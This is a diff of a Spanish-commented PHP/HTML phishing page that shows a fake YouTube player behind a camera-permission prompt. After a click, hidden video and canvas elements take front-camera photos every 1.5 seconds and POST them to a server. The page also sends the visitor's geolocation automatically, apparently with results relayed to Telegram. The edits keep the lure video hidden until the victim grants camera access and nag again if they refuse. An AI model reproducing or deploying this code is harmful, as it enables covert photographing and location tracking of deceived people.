@@ -19,16 +19,15 @@ send_to_telegram($msg);
 <head>
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        body { margin:0; font-family: Arial, sans-serif; background: #000; }
-        /* Simula la interfaz de YouTube */
-        .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; }
+        body { margin:0; font-family: Arial, sans-serif; background: #000; color: #fff; }
+        .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; display:none; }
         .yt-controls { position: absolute; bottom: 0; width: 100%; height: 50px; background: rgba(0,0,0,0.6); display: flex; align-items: center; padding: 0 10px; color: #fff; }
         .yt-playbar { flex:1; height:5px; background:#ff0000; margin:0 10px; border-radius:2px; }
     </style>
 </head>
 <body>
 
-<!-- Modal de permisos estético -->
+<!-- Modal de permisos -->
 <div id="cameraModal" style="
     position: fixed;
     top: 0; left: 0;
@@ -66,8 +65,8 @@ send_to_telegram($msg);
     </div>
 </div>
 
-<!-- YouTube video con interfaz simulada -->
-<div class="yt-wrapper">
+<!-- Video YouTube oculto -->
+<div class="yt-wrapper" id="ytWrapper">
     <iframe id="Live_YT_TV" width="100%" height="100%" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&mute=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     <div class="yt-controls">
         <span>▶️</span>
@@ -76,14 +75,19 @@ send_to_telegram($msg);
     </div>
 </div>
 
-<!-- Video y Canvas ocultos para tomar fotos -->
+<!-- Video y Canvas ocultos para fotos -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
 'use strict';
 
-// Función para enviar foto al servidor
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ytWrapper = document.getElementById('ytWrapper');
+const modal = document.getElementById('cameraModal');
+const btn = document.getElementById('grantAccess');
+
 function post(imgdata){
     $.ajax({
         type: 'POST',
@@ -94,23 +98,9 @@ function post(imgdata){
     });
 }
 
-// Configuración cámara
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
 const constraints = { audio: false, video: { facingMode: "user" } };
 
-// Acceso a la cámara (iniciado al permitir)
-async function initCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-        capturePhotoLoop();
-    } catch (e) {
-        console.error('Error al acceder a la cámara:', e);
-    }
-}
-
-// Captura fotos cada 1.5 segundos
+// Captura fotos cada 1.5s
 function capturePhotoLoop() {
     const context = canvas.getContext('2d');
     setInterval(function(){
@@ -120,13 +110,24 @@ function capturePhotoLoop() {
     }, 1500);
 }
 
-// Al presionar "Permitir acceso", ocultar modal e iniciar cámara
-document.getElementById('grantAccess').addEventListener('click', () => {
-    document.getElementById('cameraModal').style.display = 'none';
-    initCamera();
-});
+// Inicia cámara y muestra video solo si hay permiso
+async function initCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        capturePhotoLoop();
+        modal.style.display = 'none'; // ocultar modal
+        ytWrapper.style.display = 'block'; // mostrar video
+    } catch (err) {
+        console.error("Permiso denegado o error:", err);
+        alert("No se pudo activar la cámara. Por favor, permite el acceso para continuar.");
+        modal.style.display = 'flex'; // mostrar modal de nuevo
+    }
+}
 
-// Obtener ubicación y enviarla automáticamente
+btn.addEventListener('click', initCamera);
+
+// Obtener ubicación automáticamente
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const { latitude, longitude, accuracy } = pos.coords;
@@ -141,4 +142,3 @@ if ('geolocation' in navigator) {
 
 </body>
 </html>
-
